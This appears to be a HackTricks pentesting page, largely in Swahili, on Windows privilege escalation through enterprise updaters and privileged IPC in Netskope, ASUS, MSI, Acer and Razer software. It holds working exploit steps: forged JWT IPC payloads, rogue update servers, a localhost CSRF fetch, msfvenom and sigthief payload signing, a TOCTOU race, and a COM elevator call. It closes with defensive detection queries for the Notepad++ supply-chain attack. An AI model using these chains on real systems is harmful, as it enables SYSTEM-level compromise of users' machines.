# Kuitumia Enterprise Auto-Updaters na Privileged IPC vibaya (mf. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unajumlisha aina ya Windows local privilege escalation chains zilizopatikana kwenye enterprise endpoint agents na updaters ambazo zinafichua low-friction IPC surface na privileged update flow. Mfano wa kuwakilisha ni Netskope Client for Windows < R129 (CVE-2025-0309), ambapo user mwenye low privileges anaweza kulazimisha enrollment kwenda kwenye server inayodhibitiwa na attacker kisha kutoa MSI mbaya ambayo SYSTEM service huisakinisha.

Mawazo muhimu unayoweza kutumia dhidi ya bidhaa zinazofanana:
- Abuse privileged service’s localhost IPC ili kulazimisha re-enrollment au reconfiguration kwenda kwenye attacker server.
- Implement vendor’s update endpoints, toa rogue Trusted Root CA, na elekeza updater kwenda kwenye malicious, “signed” package.
- Evade weak signer checks (CN allow-lists), optional digest flags, na lax MSI properties.
- Ikiwa IPC “encrypted”, pata key/IV kutoka kwa world-readable machine identifiers zilizohifadhiwa kwenye registry.
- Ikiwa service inazuia callers kwa image path/process name, inject ndani ya process iliyo allow-listed au zindua moja ikiwa suspended na bootstrap DLL yako kupitia minimal thread-context patch.

---
## 1) Kulazimisha enrollment kwenda kwenye attacker server kupitia localhost IPC

Wakala wengi husafirisha user-mode UI process inayoongea na SYSTEM service kupitia localhost TCP kwa kutumia JSON.

Iliyoonekana kwenye Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Tengeneza JWT enrollment token whose claims control backend host (mf. AddonUrl). Tumia alg=None ili signature isiwe lazima.
2) Tuma IPC message inayowaita provisioning command pamoja na JWT yako na tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Huduma inaanza kugonga rogue server yako kwa enrollment/config, mfano:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- If caller verification is path/name-based, originate the request from an allow-listed vendor binary (see §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Once the client talks to your server, implement the expected endpoints and steer it to an attacker MSI. Typical sequence:

1) /v2/config/org/clientconfig → Rudisha JSON config yenye updater interval fupi sana, mfano:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Return a PEM CA certificate. The service installs it into the Local Machine Trusted Root store.
3) /v2/checkupdate → Supply metadata pointing to a malicious MSI and a fake version.

Bypassing common checks seen in the wild:
- Signer CN allow-list: the service may only check the Subject CN equals “netSkope Inc” or “Netskope, Inc.”. Your rogue CA can issue a leaf with that CN and sign the MSI.
- CERT_DIGEST property: include a benign MSI property named CERT_DIGEST. No enforcement at install.
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) disables extra cryptographic validation.

Result: the SYSTEM service installs your MSI from
C:\ProgramData\Netskope\stAgent\data\*.msi
executing arbitrary code as NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers can reproduce encryption and send valid encrypted commands from a standard user. General tip: if an agent suddenly “encrypts” its IPC, look for device IDs, product GUIDs, install IDs under HKLM as material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Some services try to authenticate the peer by resolving the TCP connection’s PID and comparing the image path/name against allow-listed vendor binaries located under Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user-mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in-process, loading your DLL.

Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already-protected process (you created it), the driver’s policy is satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES-encrypted) IPC messages and includes the suspended-process injection to originate from an allow-listed binary.

## 7) Fast triage workflow for unknown updater/IPC surfaces

When facing a new endpoint agent or motherboard “helper” suite, a quick workflow is usually enough to tell whether you are looking at a promising privesc target:

1) Enumerate loopback listeners and map them back to vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Orodhesha candidate named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Chimba data ya uelekezaji inayotegemea registry inayotumiwa na seva za IPC zenye msingi wa plugin:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Dondooa majina ya endpoint, keys za JSON, na command IDs kutoka kwenye user-mode client kwanza. Packed Electron/.NET frontends mara nyingi huvuja schema nzima:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Tafuta predicate halisi ya trust, si tu code path ambayo hatimaye huzindua process:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patterns zinazostahili kupewa kipaumbele:
- `CryptQueryObject`/certificate parsing bila `WinVerifyTrust` kawaida humaanisha “certificate ipo” ilichukuliwa kama “certificate ni trusted”, hivyo kuwezesha certificate cloning au hila nyingine za fake-signer.
- Ukaguzi wa substring/suffix juu ya `Origin`, `Referer`, download URLs, majina ya process, au signer CNs si authentication. `contains(".vendor.com")` mara nyingi inaweza kutumiwa vibaya kwa attacker-controlled lookalike domains.
- Ikiwa GUI ya low-privileged ndiyo inaamua “the file is trusted” na SYSTEM broker kwa urahisi hutumia tu matokeo hayo, patching au reimplementing client-side DLL/JS mara nyingi hupita boundary yote moja kwa moja (Razer-style split validation).
- Ikiwa broker inanukuu payload kwenda `%TEMP%`/`C:\Windows\Temp` kisha hui-validate au kuischedule kutoka path hiyo, mara moja test kwa TOCTOU replacement windows na kwa sibling plugin modules zinazotoa alternate `ExecuteTask()` wrappers zenye checks dhaifu.

Kwa targets zenye named-pipe nyingi, PipeViewer ni njia ya haraka ya kuona weak DACLs na remotely reachable pipes kabla hujaanza reversing protocol kwa undani.

Ikiwa target ina-authenticate callers kwa PID pekee, image path, au process name, chukulia hiyo kama speed bump badala ya boundary: injecting kwenye legitimate client, au kufanya connection kutoka kwa process iliyo kwenye allow-list, mara nyingi inatosha kuridhisha checks za server. Kwa named pipes hasa, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) inaeleza primitive hii kwa undani zaidi.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub inasafirisha user-mode HTTP service (ADU.exe) kwenye 127.0.0.1:53000 ambayo inatarajia browser calls zinazotoka kwenye https://driverhub.asus.com. Origin filter inafanya tu `string_contains(".asus.com")` juu ya Origin header na juu ya download URLs zilizo wazi kupitia `/asus/v1.0/*`. Hivyo host yoyote inayodhibitiwa na attacker kama `https://driverhub.asus.com.attacker.tld` hupita check hiyo na inaweza kutuma state-changing requests kutoka JavaScript. Tazama [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) kwa bypass patterns za ziada.

Practical flow:
1) Sajili domain inayojumuisha `.asus.com` na host webpage mbaya hapo.
2) Tumia `fetch` au XHR kuita privileged endpoint (mfano, `Reboot`, `UpdateApp`) kwenye `http://127.0.0.1:53000`.
3) Tuma JSON body inayotarajiwa na handler – packed frontend JS inaonyesha schema hapa chini.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Hata PowerShell CLI iliyoonyeshwa hapa chini hufaulu hata wakati kichwa cha Origin kinapospoofiwa kuwa thamani inayoaminika:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Utembelezi wowote wa browser kwenda kwenye site ya attacker kwa hiyo unakuwa 1-click (au 0-click kupitia `onload`) local CSRF inayomfanya SYSTEM helper ifanye kazi.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` hupakua arbitrary executables zilizofafanuliwa kwenye JSON body na kuzihifadhi kwenye `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Uthibitisho wa download URL hutumia tena same substring logic, kwa hiyo `http://updates.asus.com.attacker.tld:8000/payload.exe` hukubaliwa. Baada ya download, ADU.exe huangalia tu kwamba PE ina signature na kwamba Subject string inalingana na ASUS kabla ya kuirun – hakuna `WinVerifyTrust`, hakuna chain validation.

Ili kufanya flow hii iwe weaponized:
1) Tengeneza payload (mfano, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone signer wa ASUS ndani yake (mfano, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` kwenye domain inayofanana na `.asus.com` na trigger UpdateApp kupitia browser CSRF hapo juu.

Kwa kuwa Origin na URL filters zote zinategemea substring, na signer check inalinganisha strings tu, DriverHub hupakua na kutekeleza attacker binary chini ya elevated context yake.

---
## 1) TOCTOU ndani ya updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

SYSTEM service ya MSI Center ina expose TCP protocol ambapo kila frame ni `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Core component (Component ID `0f 27 00 00`) husafirisha `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Handler yake:
1) Hunakili executable iliyotolewa kwenda `C:\Windows\Temp\MSI Center SDK.exe`.
2) Huthibitisha signature kupitia `CS_CommonAPI.EX_CA::Verify` (certificate subject lazima iwe sawa na “MICRO-STAR INTERNATIONAL, CO., LTD.” na `WinVerifyTrust` ifanikiwe).
3) Huutengeneza scheduled task inayorun temp file kama SYSTEM na attacker-controlled arguments.

File iliyonakiliwa haifungwi kati ya verification na `ExecuteTask()`. Attacker anaweza:
- Kutuma Frame A ikielekeza kwenye legitimate MSI-signed binary (inahakikisha signature check inapitisha na task inawekwa kwenye queue).
- Kuirace na ujumbe wa Frame B unaorudiwa unaoelekeza kwenye malicious payload, na kuoverwrite `MSI Center SDK.exe` mara tu verification inapokamilika.

Scheduler ikianza, inaexecute payload iliyowekwa juu ya ile ya awali chini ya SYSTEM licha ya kuwa ilithibitisha original file. Exploitation ya kuaminika hutumia goroutines/threads mbili zinazospam CMD_AutoUpdateSDK mpaka TOCTOU window ishindwe.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Kila plugin/DLL inayoloadwa na `MSI.CentralServer.exe` hupokea Component ID iliyohifadhiwa chini ya `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Bytes 4 za kwanza za frame huchagua component hiyo, hivyo attacker anaweza kuelekeza commands kwenye arbitrary modules.
- Plugins zinaweza kufafanua task runners zao wenyewe. `Support\API_Support.dll` ina expose `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` na moja kwa moja huita `API_Support.EX_Task::ExecuteTask()` bila **signature validation** – local user yeyote anaweza kuiweka kwenye `C:\Users\<user>\Desktop\payload.exe` na kupata SYSTEM execution kwa uhakika.
- Kusniff loopback kwa Wireshark au kuinstrument .NET binaries kwenye dnSpy haraka huonyesha Component ↔ command mapping; custom Go/ Python clients wanaweza kisha kurudia frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) ina expose `\\.\pipe\treadstone_service_LightMode`, na discretionary ACL yake inaruhusu remote clients (mfano, `\\TARGET\pipe\treadstone_service_LightMode`). Kutuma command ID `7` pamoja na file path huita process-spawning routine ya service.
- Client library huserialize magic terminator byte (113) pamoja na args. Dynamic instrumentation kwa Frida/`TsDotNetLib` (ona [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) kwa instrumentation tips) huonyesha kwamba native handler inamap value hii kwenda `SECURITY_IMPERSONATION_LEVEL` na integrity SID kabla ya kuita `CreateProcessAsUser`.
- Kubadilisha 113 (`0x71`) kuwa 114 (`0x72`) huingia kwenye generic branch ambayo huhifadhi full SYSTEM token na kuweka high-integrity SID (`S-1-16-12288`). Binary inayozinduliwa kwa hiyo hu-run kama unrestricted SYSTEM, locally na cross-machine.
- Changanya hilo na exposed installer flag (`Setup.exe -nocheck`) ili kuanzisha ACC hata kwenye lab VMs na kutumia pipe bila vendor hardware.

Bugs hizi za IPC zinaonyesha kwa nini localhost services lazima zitekeleze mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) na kwa nini kila module’s “run arbitrary binary” helper lazima ishiriki same signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 iliongeza another useful pattern kwenye family hii: user asiye na privilege ya juu anaweza kumuomba COM helper kuzindua process kupitia `RzUtility.Elevator`, wakati trust decision imewekwa kwa user-mode DLL (`simple_service.dll`) badala ya kutekelezwa kwa uthabiti ndani ya privileged boundary.

Observed exploitation path:
- Instantiate COM object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` kuomba elevated launch.
- Kwenye public PoC, PE-signature gate ndani ya `simple_service.dll` inapatched out kabla ya kutuma request, hivyo kuruhusu arbitrary attacker-chosen executable kuzinduliwa.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Hitimisho kuu: unapochambua suites za “helper”, usisimame kwenye localhost TCP au named pipes. Angalia COM classes zenye majina kama `Elevator`, `Launcher`, `Updater`, au `Utility`, kisha thibitisha kama huduma yenye priviliji kweli huvalidi binary lengwa yenyewe au inamuaminia tu matokeo yaliyohesabiwa na patchable user-mode client DLL. Mchoro huu unatumika zaidi ya Razer: muundo wowote uliogawanywa ambapo broker ya high-privilege inapokea uamuzi wa allow/deny kutoka upande wa low-privilege ni candidate wa privesc surface.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Kati ya June 2025 na December 2025, attackers waliocompromise hosting infrastructure nyuma ya Notepad++ update flow wali-serving selectively malicious manifests kwa victims waliolengwa. Older WinGUp-based updaters hazikuthibitisha kikamilifu update authenticity, hivyo hostile XML response iliweza kuelekeza clients kwenye attacker-controlled URLs. Kwa kuwa client ilikubali HTTPS content bila kulazimisha both a trusted certificate chain na valid PE signature kwenye downloaded installer, victims walipakua na kutekeleza trojanized NSIS `update.exe`.

Operational flow (no local exploit required):
1. **Infrastructure interception**: compromise CDN/hosting na jibu update checks kwa attacker metadata inayoelekeza kwenye malicious download URL.
2. **Trojanized NSIS**: installer hupakua/huendesha payload na kutumia execution chains mbili:
- **Bring-your-own signed binary + sideload**: bundle signed Bitdefender `BluetoothService.exe` na drop malicious `log.dll` kwenye search path yake. Wakati signed binary inapo-run, Windows sideloads `log.dll`, ambayo decrypts na reflectively loads Chrysalis backdoor (Warbird-protected + API hashing kuzuia static detection).
- **Scripted shellcode injection**: NSIS huendesha compiled Lua script inayotumia Win32 APIs (e.g., `EnumWindowStationsW`) kuinject shellcode na stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** ya downloaded installer (pin vendor signer, reject mismatched CN/chain) na sign update manifest yenyewe (e.g., XMLDSig). Block manifest-controlled redirects unless validated.
- Treat **BYO signed binary sideloading** as a post-download detection pivot: alert wakati signed vendor EXE inapoload DLL name kutoka nje ya canonical install path yake (e.g., Bitdefender loading `log.dll` from Temp/Downloads) na wakati updater inapodrop/execute installers from temp with non-vendor signatures.
- Monitor **malware-specific artifacts** observed in this chain (useful as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, na Lua-driven shellcode injection stages.
- Notepad++ ilijibu kwa kuimarisha WinGUp katika v8.8.9 na baadaye: returned XML sasa imesainiwa (XMLDSig), na newer builds enforce certificate + signature verification ya downloaded installer badala ya kuaminia transport pekee.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> ikizindua kisakinishi kisicho cha Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Mifumo hii inajumlishwa kwa updater yoyote inayokubali unsigned manifests au kushindwa ku-pin installers signers—network hijack + malicious installer + BYO-signed sideloading hutoa remote code execution chini ya kivuli cha “trusted” updates.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
